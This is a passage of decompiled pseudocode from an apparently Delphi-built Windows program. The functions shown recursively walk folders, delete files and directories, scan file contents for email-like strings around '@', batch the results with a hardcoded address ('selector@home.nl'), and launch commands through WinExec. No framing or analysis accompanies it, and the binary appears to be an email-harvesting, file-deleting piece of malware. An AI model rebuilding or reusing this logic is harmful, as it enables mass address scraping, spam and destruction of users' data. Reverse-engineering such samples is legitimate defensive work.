  sub_4034C8(&v15);
  return sub_4034C8(&v17);
}
// 41699A: variable 'v6' is possibly undefined

//----- (00416A1C) --------------------------------------------------------
int __userpurge sub_416A1C@<eax>(char *a1@<eax>, int *a2@<edx>, int a3@<ecx>, volatile __int32 *a4)
{
  unsigned int v6[2]; // [esp-Ch] [ebp-174h] BYREF
  int *v7; // [esp-4h] [ebp-16Ch]
  int v8[83]; // [esp+8h] [ebp-160h] BYREF
  __int32 v9; // [esp+154h] [ebp-14h] BYREF
  __int32 v10; // [esp+158h] [ebp-10h] BYREF
  int v11; // [esp+15Ch] [ebp-Ch] BYREF
  int *v12; // [esp+160h] [ebp-8h] BYREF
  char *v13; // [esp+164h] [ebp-4h]
  int savedregs; // [esp+168h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v12 = a2;
  v13 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v12);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_416B0F;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_4034C8(&v9);
  sub_404E16(v8, v13);
  *off_41DC30 = 0;
  sub_40510D((int)v8, 1);
  sub_40265C();
  do
  {
    sub_404EB8((int)v8, &unk_41E6D8, 2048, (DWORD *)&v11);
    sub_40265C();
    sub_41692C(v11, a3, v12, &v10);
    if ( v10 )
      sub_403560(&v9, v10);
  }
  while ( v11 );
  sub_404F80((int)v8);
  sub_40265C();
  sub_40351C(a4, v9);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_416B16;
  sub_4034EC((int)&v9, 2);
  return sub_4034EC((int)&v12, 2);
}
// 41DC30: using guessed type char *off_41DC30;
// 416A1C: using guessed type _DWORD var_160[83];

//----- (00416B20) --------------------------------------------------------
int __usercall sub_416B20@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v4; // ebx
  unsigned int v6[2]; // [esp-Ch] [ebp-2C0h] BYREF
  int *v7; // [esp-4h] [ebp-2B8h]
  int v8[83]; // [esp+8h] [ebp-2ACh] BYREF
  int v9[83]; // [esp+154h] [ebp-160h] BYREF
  char v10; // [esp+2A3h] [ebp-11h] BYREF
  char *v11; // [esp+2A4h] [ebp-10h] BYREF
  int v12; // [esp+2A8h] [ebp-Ch] BYREF
  char *v13; // [esp+2ACh] [ebp-8h] BYREF
  char *v14; // [esp+2B0h] [ebp-4h]
  int savedregs; // [esp+2B4h] [ebp+0h] BYREF

  v11 = 0;
  v13 = a2;
  v14 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v13);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_416C45;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( !sub_4071A8(v13) )
  {
    v4 = 0;
    sub_4073EC(v14, &v11);
    sub_404E16(v9, v14);
    sub_404E16(v8, v13);
    *off_41DC30 = 0;
    sub_40510D((int)v9, 1);
    sub_40265C();
    sub_405124((int)v8, 1);
    sub_40265C();
    do
    {
      sub_404EB8((int)v9, &v10, 1, (DWORD *)&v12);
      sub_40265C();
      if ( a3 <= ++v4 )
      {
        sub_404F1C((int)v8, &v10, v12, (DWORD *)&v12);
        sub_40265C();
      }
    }
    while ( v12 );
    sub_404F80((int)v9);
    sub_40265C();
    sub_404F80((int)v8);
    sub_40265C();
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_416C4C;
  sub_4034C8(&v11);
  return sub_4034EC((int)&v13, 2);
}
// 41DC30: using guessed type char *off_41DC30;
// 416B20: using guessed type _DWORD var_160[83];
// 416B20: using guessed type _DWORD var_2AC[83];

//----- (00416C54) --------------------------------------------------------
int __usercall sub_416C54@<eax>(char *a1@<eax>, int a2@<edx>)
{
  char v3; // zf
  char *v4; // eax
  char *v5; // eax
  UINT ExceptionList; // [esp-Ch] [ebp-7Ch] BYREF
  void *v8; // [esp-8h] [ebp-78h]
  int *v9; // [esp-4h] [ebp-74h]
  void *v10; // [esp+0h] [ebp-70h]
  char *v11; // [esp+4h] [ebp-6Ch] BYREF
  char *v12; // [esp+8h] [ebp-68h] BYREF
  char *v13; // [esp+Ch] [ebp-64h] BYREF
  __int32 v14; // [esp+10h] [ebp-60h] BYREF
  char *v15; // [esp+14h] [ebp-5Ch] BYREF
  __int32 v16; // [esp+18h] [ebp-58h] BYREF
  char *v17; // [esp+1Ch] [ebp-54h] BYREF
  __int32 v18; // [esp+20h] [ebp-50h] BYREF
  char *v19; // [esp+24h] [ebp-4Ch] BYREF
  __int32 v20; // [esp+28h] [ebp-48h] BYREF
  __int32 v21; // [esp+2Ch] [ebp-44h] BYREF
  char *v22; // [esp+30h] [ebp-40h] BYREF
  char *v23; // [esp+34h] [ebp-3Ch] BYREF
  __int32 v24; // [esp+38h] [ebp-38h] BYREF
  char *v25; // [esp+3Ch] [ebp-34h] BYREF
  __int32 v26; // [esp+40h] [ebp-30h] BYREF
  __int32 v27; // [esp+44h] [ebp-2Ch] BYREF
  char *v28; // [esp+48h] [ebp-28h] BYREF
  __int32 v29; // [esp+4Ch] [ebp-24h] BYREF
  __int32 v30; // [esp+50h] [ebp-20h] BYREF
  char *v31; // [esp+54h] [ebp-1Ch] BYREF
  __int32 v32; // [esp+58h] [ebp-18h] BYREF
  char *v33; // [esp+5Ch] [ebp-14h] BYREF
  char *v34; // [esp+60h] [ebp-10h] BYREF
  __int32 v35; // [esp+64h] [ebp-Ch] BYREF
  __int32 v36; // [esp+68h] [ebp-8h] BYREF
  char *v37; // [esp+6Ch] [ebp-4h]
  int savedregs; // [esp+70h] [ebp+0h] BYREF

  v37 = a1;
  sub_4038D8((int)a1);
  v9 = &savedregs;
  v8 = &loc_416F90;
  ExceptionList = (UINT)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_415EAC(dword_41EEFC, (char *)dword_416FB0, (char *)dword_416FA4, &v32, 1, 1);
  sub_4073EC(v37, &v33);
  sub_407324(v33, 0, (volatile __int32 *)&v34);
  if ( !sub_4039B4(dword_416FBC, v34) )
    sub_403560((volatile __int32 *)&v34, (__int32)v33);
  sub_4037E4(&dword_41EEF4, 3);
  sub_41609C(6, &v31);
  sub_403770((volatile __int32 *)&v34, v31, v34);
  sub_416B20(v37, v34, a2 + 1);
  sub_416178(v34, (char *)dword_41EEF4, 1);
  sub_415EAC(dword_41EEFC, "FB1B", (char *)dword_41EEF4, &v30, 1, 1);
  ExceptionList = 1;
  sub_416A1C(v37, dword_416FE4, 90, &v27);
  sub_406E9C(v27, &v28);
  sub_415EAC(dword_41EEFC, "FB1BB", v28, &v29, 1, ExceptionList);
  ExceptionList = 1;
  sub_416A1C(v37, dword_417000, 90, &v24);
  sub_406E9C(v24, &v25);
  sub_415EAC(dword_41EEFC, "FB1BA", v25, &v26, 1, ExceptionList);
  sub_41620C((int)v34, &v23);
  sub_415FAC((int)v23, 1, &v36);
  sub_403834(v36, dword_41701C);
  if ( v3 )
  {
    ExceptionList = 1;
    sub_407424(v34, &v22);
    v4 = sub_4038E8(v22);
    WinExec(v4, ExceptionList);
  }
  else
  {
    sub_415FAC((int)dword_417028, 0, &v21);
    sub_40351C(&dword_41EEF4, v21);
    sub_403834(v36, dword_417068);
    if ( v3 )
    {
      ExceptionList = 0;
      sub_415FAC((int)dword_417074, 0, (volatile __int32 *)&v19);
      sub_403770(&v20, (char *)dword_41EEF4, v19);
      sub_415EAC(v20, 0, 0, &v35, 1, ExceptionList);
      if ( !v35 )
      {
        ExceptionList = 0;
        sub_415FAC((int)dword_41708C, 0, (volatile __int32 *)&v17);
        sub_403770(&v18, (char *)dword_41EEF4, v17);
        sub_415EAC(v18, 0, 0, &v35, 1, ExceptionList);
      }
    }
    else
    {
      sub_403834(v36, dword_4170A4);
      if ( v3 )
      {
        ExceptionList = 0;
        sub_415FAC((int)dword_4170B0, 0, (volatile __int32 *)&v15);
        sub_403770(&v16, (char *)dword_41EEF4, v15);
        sub_415EAC(v16, 0, 0, &v35, 1, ExceptionList);
      }
      else
      {
        sub_403834(v36, dword_4170C4);
        if ( v3 )
        {
          ExceptionList = 0;
          sub_415FAC((int)dword_4170D0, 0, (volatile __int32 *)&v13);
          sub_403770(&v14, (char *)dword_41EEF4, v13);
          sub_415EAC(v14, 0, 0, &v35, 1, ExceptionList);
        }
      }
    }
    if ( !v35 )
      sub_415FAC((int)dword_4170E4, 0, &v35);
    ExceptionList = 1;
    sub_407424(v34, &v11);
    sub_4037E4((volatile __int32 *)&v12, 3);
    v5 = sub_4038E8(v12);
    WinExec(v5, ExceptionList);
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_416F97;
  return sub_4034EC((int)&v11, 27);
}
// 416DE1: variable 'v3' is possibly undefined
// 416FA4: using guessed type int dword_416FA4[3];
// 416FB0: using guessed type int dword_416FB0[3];
// 416FBC: using guessed type int dword_416FBC[3];
// 416FE4: using guessed type int dword_416FE4[3];
// 417000: using guessed type int dword_417000[3];
// 41701C: using guessed type int dword_41701C[3];
// 417028: using guessed type int dword_417028[14];
// 417068: using guessed type int dword_417068[3];
// 417074: using guessed type int dword_417074[4];
// 41708C: using guessed type int dword_41708C[4];
// 4170A4: using guessed type int dword_4170A4[3];
// 4170B0: using guessed type int dword_4170B0[5];
// 4170C4: using guessed type int dword_4170C4[3];
// 4170D0: using guessed type int dword_4170D0[5];
// 4170E4: using guessed type int dword_4170E4[12];
// 41EEF0: using guessed type int dword_41EEF0;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;

//----- (00417118) --------------------------------------------------------
int __usercall sub_417118@<eax>(char *a1@<eax>)
{
  int v1; // ebx
  unsigned int v3[2]; // [esp-Ch] [ebp-168h] BYREF
  int *v4; // [esp-4h] [ebp-160h]
  int v5[83]; // [esp+4h] [ebp-158h] BYREF
  int v6; // [esp+150h] [ebp-Ch] BYREF
  char v7; // [esp+157h] [ebp-5h] BYREF
  char *v8; // [esp+158h] [ebp-4h] BYREF
  int savedregs; // [esp+15Ch] [ebp+0h] BYREF

  v8 = a1;
  sub_4038D8((int)a1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_4171B2;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_404E16(v5, v8);
  *off_41DC30 = 0;
  sub_40510D((int)v5, 1);
  sub_40265C();
  v1 = 0;
  do
  {
    sub_404EB8((int)v5, &v7, 1, (DWORD *)&v6);
    sub_40265C();
    ++v1;
  }
  while ( v6 );
  sub_404F80((int)v5);
  sub_40265C();
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_4171B9;
  sub_4034C8(&v8);
  return v1 - 1;
}
// 41DC30: using guessed type char *off_41DC30;
// 417118: using guessed type _DWORD var_158[83];
// 417118: using guessed type DWORD var_C;

//----- (004171C0) --------------------------------------------------------
int __userpurge sub_4171C0@<eax>(char *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, char a4, int a5, int a6, int a7)
{
  int v7; // ebx
  char v8; // zf
  int v9; // eax
  int v11; // [esp-1Ch] [ebp-34h]
  int v12; // [esp-18h] [ebp-30h]
  char *v13; // [esp-10h] [ebp-28h]
  unsigned int v14[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v15; // [esp-4h] [ebp-1Ch]
  __int32 v16; // [esp+4h] [ebp-14h] BYREF
  __int32 v17; // [esp+8h] [ebp-10h] BYREF
  char *v18; // [esp+Ch] [ebp-Ch]
  char *v19; // [esp+10h] [ebp-8h]
  char *v20; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v7 = 1;
  v16 = 0;
  v17 = 0;
  v18 = a3;
  v19 = a2;
  v20 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v19);
  sub_4038D8((int)v18);
  sub_4038D8(a7);
  sub_4038D8(a6);
  sub_4038D8(a5);
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_4172D2;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  sub_403560(&v17, (__int32)"FA2sc");
  sub_403560(
    &v17,
    (__int32)"FA5selector@home.nl                                                                          ");
  sub_403560(&v17, (__int32)"FA8137216  ");
  sub_403560(
    &v17,
    (__int32)"FA9mail                                                                                      ");
  if ( a4 )
  {
    sub_416A1C(v19, dword_4173E0, 2, &v16);
    sub_403834(v16, &dword_4173EC);
    LOBYTE(v7) = !v8;
  }
  if ( (_BYTE)v7 )
  {
    v13 = (char *)a7;
    v12 = a6;
    v11 = a5;
    v9 = sub_417118(v20);
    sub_416478(v20, v19, v18, a4, 1, v9, v11, v12, (int)&dword_4173EC, v13);
  }
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_4172D9;
  sub_4034EC((int)&v16, 5);
  sub_4034EC((int)&a5, 3);
  return v7;
}
// 417275: variable 'v8' is possibly undefined
// 4173E0: using guessed type int dword_4173E0[3];
// 4173EC: using guessed type int dword_4173EC;

//----- (004173F0) --------------------------------------------------------
_DWORD *__cdecl sub_4173F0(int a1)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-114h] BYREF
  void *v3; // [esp-8h] [ebp-110h]
  int *v4; // [esp-4h] [ebp-10Ch]
  void *v5; // [esp+0h] [ebp-108h] BYREF
  char v6[256]; // [esp+4h] [ebp-104h] BYREF
  char *v7; // [esp+104h] [ebp-4h] BYREF
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v5 = 0;
  v7 = 0;
  v4 = &savedregs;
  v3 = &loc_4174A1;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40296C(++*(_DWORD *)(a1 - 4), v6);
  sub_4036EC(&v7, v6);
  sub_415FAC((int)"9luv", 0, (volatile __int32 *)&v5);
  sub_4037E4((volatile __int32 *)&v7, 3);
  (*(void (**)(void))(**(_DWORD **)(a1 - 12) + 100))();
  sub_4071B8(v7, 2u);
  __writefsdword(0, (unsigned int)v3);
  v5 = &loc_4174A8;
  sub_4034C8(&v5);
  return sub_4034C8(&v7);
}

//----- (004174BC) --------------------------------------------------------
int __usercall sub_4174BC@<eax>(int a1@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-96Ch] BYREF
  void *v4; // [esp-8h] [ebp-968h]
  int *v5; // [esp-4h] [ebp-964h]
  void *v6; // [esp+0h] [ebp-960h]
  char *v7; // [esp+8h] [ebp-958h] BYREF
  char *v8; // [esp+Ch] [ebp-954h] BYREF
  char v9[2048]; // [esp+10h] [ebp-950h] BYREF
  int v10[83]; // [esp+810h] [ebp-150h] BYREF
  DWORD v11; // [esp+95Ch] [ebp-4h] BYREF
  int savedregs; // [esp+960h] [ebp+0h] BYREF

  v7 = 0;
  v8 = 0;
  v5 = &savedregs;
  v4 = &loc_41759F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4034C8(&dword_41EEDC);
  (*(void (__fastcall **)(char **, int, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)dword_41EF14 + 12))(
    &v8,
    a1,
    ExceptionList);
  sub_404E16(v10, v8);
  sub_40510D((int)v10, 1);
  sub_40265C();
  do
  {
    sub_404EB8((int)v10, v9, 2048, &v11);
    sub_40265C();
    sub_4035B0(&v7, v9, 2048);
    sub_40372C((char **)&dword_41EEDC, (__int32)v7);
  }
  while ( v11 );
  sub_404F80((int)v10);
  sub_40265C();
  __writefsdword(0, (unsigned int)v4);
  v6 = &loc_4175A6;
  return sub_4034EC((int)&v7, 2);
}
// 41EEDC: using guessed type int dword_41EEDC;
// 41EF14: using guessed type int dword_41EF14;
// 4174BC: using guessed type _DWORD var_150[83];

//----- (004175AC) --------------------------------------------------------
int __usercall sub_4175AC@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  _BYTE *v3; // edi
  int i; // esi
  char v5; // bl
  _BYTE *j; // esi
  char v7; // bl
  int v8; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-2Ch] BYREF
  void *v11; // [esp-14h] [ebp-28h]
  int *v12; // [esp-10h] [ebp-24h]
  int v13; // [esp-Ch] [ebp-20h]
  int v14; // [esp-8h] [ebp-1Ch]
  int v15; // [esp-4h] [ebp-18h]
  char *v16; // [esp+0h] [ebp-14h] BYREF
  char *v17; // [esp+4h] [ebp-10h] BYREF
  char *v18; // [esp+8h] [ebp-Ch] BYREF
  char *v19; // [esp+Ch] [ebp-8h] BYREF
  char *v20; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = a1;
  v14 = a3;
  v13 = a2;
  v12 = &savedregs;
  v11 = &loc_417795;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  do
  {
    v3 = sub_4039B4(dword_4177AC, (_BYTE *)dword_41EEDC);
    if ( (int)v3 > 0 )
    {
      sub_4034C8(&v19);
      sub_4034C8(&v18);
      sub_40392C(dword_41EEDC, (int)(v3 - 18), 50, &v20);
      for ( i = (int)(sub_4039B4(dword_4177AC, v20) - 1); i > 1; --i )
      {
        v5 = v20[i - 1];
        if ( (unsigned __int8)(v5 - 97) < 0x1Au
          || (unsigned __int8)(v5 - 65) < 0x1Au
          || v5 == 46
          || v5 == 95
          || (unsigned __int8)(v5 - 48) < 0xAu )
        {
          sub_403670(&v17);
          sub_403770((volatile __int32 *)&v19, v17, v19);
        }
        else
        {
          i = 0;
        }
      }
      for ( j = sub_4039B4(dword_4177AC, v20) + 1; (int)j < sub_403724((int)v20); ++j )
      {
        v7 = j[(_DWORD)v20 - 1];
        if ( (unsigned __int8)(v7 - 97) < 0x1Au
          || (unsigned __int8)(v7 - 65) < 0x1Au
          || v7 == 46
          || v7 == 45
          || v7 == 95
          || (unsigned __int8)(v7 - 48) < 0xAu )
        {
          sub_403670(&v16);
          sub_40372C(&v18, (__int32)v16);
        }
        else
        {
          j = (_BYTE *)sub_403724((int)v20);
        }
      }
      sub_4037E4((volatile __int32 *)&v20, 3);
      if ( (unsigned __int8)(*v20 - 48) >= 0xAu
        && (int)sub_4039B4(&dword_4177B8, v18) > 0
        && *v20 != 64
        && sub_403724((int)v20) > 5 )
      {
        v8 = sub_403724((int)v20);
        if ( v20[v8 - 1] != 64 )
          (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, int, int, int))(*(_DWORD *)dword_41EF18 + 52))(
            ExceptionList,
            v11,
            v12,
            v13,
            v14,
            v15);
      }
      sub_40396C((char **)&dword_41EEDC, 1, (int)(v3 + 1));
    }
  }
  while ( v3 );
  __writefsdword(0, (unsigned int)ExceptionList);
  v12 = (int *)&loc_41779C;
  return sub_4034EC((int)&v16, 5);
}
// 4175AC: could not find valid save-restore pair for ebx
// 4175AC: could not find valid save-restore pair for edi
// 4175AC: could not find valid save-restore pair for esi
// 4177AC: using guessed type int dword_4177AC[3];
// 4177B8: using guessed type int dword_4177B8;
// 41EEDC: using guessed type int dword_41EEDC;
// 41EF18: using guessed type int dword_41EF18;

//----- (004177BC) --------------------------------------------------------
int __usercall sub_4177BC@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v2; // eax
  int v3; // esi
  int v4; // ebx
  int v5; // esi
  int v6; // ebx
  char v7; // zf
  int v8; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-3Ch] BYREF
  void *v11; // [esp-8h] [ebp-38h]
  int *v12; // [esp-4h] [ebp-34h]
  void *v13; // [esp+0h] [ebp-30h]
  int v14; // [esp+Ch] [ebp-24h] BYREF
  _BYTE *v15; // [esp+10h] [ebp-20h] BYREF
  char *v16; // [esp+14h] [ebp-1Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v17; // [esp+18h] [ebp-18h] BYREF
  _BYTE *v18; // [esp+1Ch] [ebp-14h] BYREF
  int v19; // [esp+20h] [ebp-10h]
  _DWORD *v20; // [esp+24h] [ebp-Ch]
  int v21; // [esp+28h] [ebp-8h] BYREF
  int v22; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v21 = a1;
  sub_4038D8(a1);
  v12 = &savedregs;
  v11 = &loc_417915;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v22 = 0;
  v20 = sub_402BAC(&off_40BBB4, 1);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)dword_41EF18 + 64))(ExceptionList);
  v2 = (*(int (**)(void))(*(_DWORD *)dword_41EF14 + 20))() - 1;
  if ( v2 >= 0 )
  {
    v3 = v2 + 1;
    v4 = 0;
    do
    {
      sub_4174BC(v4);
      sub_4175AC(v4++, a2, v3--);
    }
    while ( v3 );
  }
  (*(void (**)(void))(*(_DWORD *)dword_41EF18 + 124))();
  v19 = 0;
  v5 = (*(int (**)(void))(*(_DWORD *)dword_41EF18 + 20))() - 1;
  if ( v5 > 0 )
  {
    v6 = 1;
    do
    {
      sub_406D54(v18, (char **)&v17);
      ExceptionList = v17;
      (*(void (__fastcall **)(_BYTE **, int))(*(_DWORD *)dword_41EF18 + 12))(&v15, v6);
      sub_406D54(v15, &v16);
      sub_403834((int)ExceptionList, (int *)v16);
      if ( !v7 )
      {
        if ( v19 == 500 )
        {
          sub_4173F0((int)&savedregs);
          (*(void (**)(void))(*v20 + 64))();
          v19 = 0;
        }
        else
        {
          (*(void (__fastcall **)(int *, int))(*(_DWORD *)dword_41EF18 + 12))(&v14, v6);
          (*(void (**)(void))(*v20 + 52))();
          ++v19;
        }
      }
      (*(void (__fastcall **)(_BYTE **, int))(*(_DWORD *)dword_41EF18 + 12))(&v18, v6++);
      --v5;
    }
    while ( v5 );
  }
  if ( v19 )
    sub_4173F0((int)&savedregs);
  sub_402BDC(v20);
  v8 = v22;
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_41791C;
  sub_4034EC((int)&v14, 5);
  sub_4034C8(&v21);
  return v8;
}
// 417885: variable 'v7' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 41EF14: using guessed type int dword_41EF14;
// 41EF18: using guessed type int dword_41EF18;

//----- (00417928) --------------------------------------------------------
int __userpurge sub_417928@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // eax
  char v6; // zf
  char *v7; // eax
  int v8; // eax
  char *v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-190h] BYREF
  int *v12; // [esp-4h] [ebp-188h]
  __int32 v13; // [esp+8h] [ebp-17Ch] BYREF
  char *v14; // [esp+Ch] [ebp-178h] BYREF
  char *v15; // [esp+10h] [ebp-174h] BYREF
  char *v16; // [esp+14h] [ebp-170h] BYREF
  char *v17; // [esp+18h] [ebp-16Ch] BYREF
  char *v18; // [esp+1Ch] [ebp-168h] BYREF
  char *v19; // [esp+20h] [ebp-164h] BYREF
  char v20[12]; // [esp+24h] [ebp-160h] BYREF
  char *v21; // [esp+30h] [ebp-154h]
  char *v22; // [esp+17Ch] [ebp-8h] BYREF
  char *v23; // [esp+180h] [ebp-4h] BYREF
  int savedregs; // [esp+184h] [ebp+0h] BYREF

  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  v22 = a2;
  v23 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v22);
  sub_403AF0((int)v20, (int)dword_4061D8);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_417BCB;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v5 = sub_403724((int)v23);
  if ( v23[v5 - 1] != 92 )
    sub_40372C(&v23, (__int32)dword_417BE4);
  sub_403770((volatile __int32 *)&v19, v23, (char *)dword_417BF0);
  if ( !sub_407244(v19, 63, (int)v20) )
  {
    do
    {
      sub_403834((int)v21, dword_417BFC);
      if ( !v6 )
      {
        sub_403834((int)v21, &dword_417C08);
        if ( !v6 && (v20[8] & 0x10) != 0 )
        {
          sub_403770((volatile __int32 *)&v18, v23, v21);
          sub_417928(v18, v22, a3, a4);
          if ( (_BYTE)a4 )
          {
            sub_403770((volatile __int32 *)&v17, v23, v21);
            v7 = sub_4038E8(v17);
            RemoveDirectoryA(v7);
          }
        }
      }
    }
    while ( !sub_407294((int)v20) );
  }
  sub_4072B8((int)v20);
  v8 = sub_403724((int)v23);
  if ( v23[v8 - 1] != 92 )
    sub_40372C(&v23, (__int32)dword_417BE4);
  sub_403770((volatile __int32 *)&v16, v23, v22);
  if ( !sub_407244(v16, 47, (int)v20) )
  {
    do
    {
      sub_403834((int)v21, dword_417BFC);
      if ( !v6 )
      {
        sub_403834((int)v21, &dword_417C08);
        if ( !v6 )
        {
          if ( v21 )
          {
            if ( (_BYTE)a4 )
            {
              sub_403770((volatile __int32 *)&v15, v23, v21);
              sub_4071B8(v15, 0);
              sub_403770((volatile __int32 *)&v14, v23, v21);
              v9 = sub_4038E8(v14);
              DeleteFileA(v9);
            }
            else
            {
              sub_403770(&v13, v23, v21);
              (*(void (**)(void))(**(_DWORD **)a3 + 52))();
            }
          }
        }
      }
    }
    while ( !sub_407294((int)v20) );
  }
  sub_4072B8((int)v20);
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_417BD2;
  sub_4034EC((int)&v13, 7);
  sub_403BBC((int)v20, (int)dword_4061D8);
  return sub_4034EC((int)&v22, 2);
}
// 4179F9: variable 'v6' is possibly undefined
// 4061D8: using guessed type int dword_4061D8[5];
// 417BE4: using guessed type int dword_417BE4[3];
// 417BF0: using guessed type int dword_417BF0[3];
// 417BFC: using guessed type int dword_417BFC[3];
// 417C08: using guessed type int dword_417C08;

//----- (00417C20) --------------------------------------------------------
_DWORD *__usercall sub_417C20@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  bool v6; // sf
  bool v7; // of
  int v8; // esi
  int v9; // ebx
  int v10; // esi
  int v11; // et0
  unsigned int v13[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v14; // [esp-4h] [ebp-10h]
  char *v15; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v15 = a1;
  sub_4038D8((int)a1);
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_417C7C;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v7 = __OFSUB__(a3, a2);
  v6 = a3 - a2 < 0;
  v8 = a3 - a2;
  if ( v6 == v7 )
  {
    v11 = a2;
    v9 = v8 + 1;
    v10 = v11;
    do
    {
      sub_417928(v15, *(char **)(*(_DWORD *)(a4 - 4) + 4 * v10++), (int)&dword_41EF14, 0);
      --v9;
    }
    while ( v9 );
  }
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_417C83;
  return sub_4034C8(&v15);
}
// 41EF14: using guessed type int dword_41EF14;

//----- (00417C88) --------------------------------------------------------
int __userpurge sub_417C88@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5, int a6)
{
  int v7; // eax
  char *v9; // [esp-18h] [ebp-130h]
  int ExceptionList; // [esp-Ch] [ebp-124h] BYREF
  void *v11; // [esp-8h] [ebp-120h]
  int *v12; // [esp-4h] [ebp-11Ch]
  void *v13; // [esp+0h] [ebp-118h]
  __int32 v14; // [esp+4h] [ebp-114h] BYREF
  char *v15; // [esp+8h] [ebp-110h] BYREF
  __int32 v16; // [esp+Ch] [ebp-10Ch] BYREF
  char v17[256]; // [esp+10h] [ebp-108h] BYREF
  int v18; // [esp+110h] [ebp-8h] BYREF
  char *v19; // [esp+114h] [ebp-4h]
  int savedregs; // [esp+118h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v18 = a2;
  v19 = a1;
  sub_4038D8((int)a1);
  sub_4038D8(v18);
  v12 = &savedregs;
  v11 = &loc_417D7E;
  ExceptionList = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(int))(*(_DWORD *)dword_41EF14 + 64))(ExceptionList);
  sub_417C20(v19, a3, a5, a6);
  v7 = sub_4177BC(v18, a4);
  sub_40296C(v7, v17);
  sub_4036EC((char **)&dword_41EEF4, v17);
  ExceptionList = 1;
  sub_41620C(v18, &v15);
  v9 = v15;
  sub_403770(&v14, (char *)dword_41EEFC, "\\FA0");
  sub_415EAC(v14, v9, (char *)dword_41EEF4, &v16, 1, ExceptionList);
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_417D85;
  sub_4034EC((int)&v14, 3);
  return sub_4034EC((int)&v18, 2);
}
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;
// 41EF14: using guessed type int dword_41EF14;

//----- (00417D9C) --------------------------------------------------------
int __userpurge sub_417D9C@<eax>(char *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, int a4, int a5, int a6)
{
  int v6; // eax
  char *v8; // [esp-18h] [ebp-13Ch]
  int ExceptionList; // [esp-Ch] [ebp-130h] BYREF
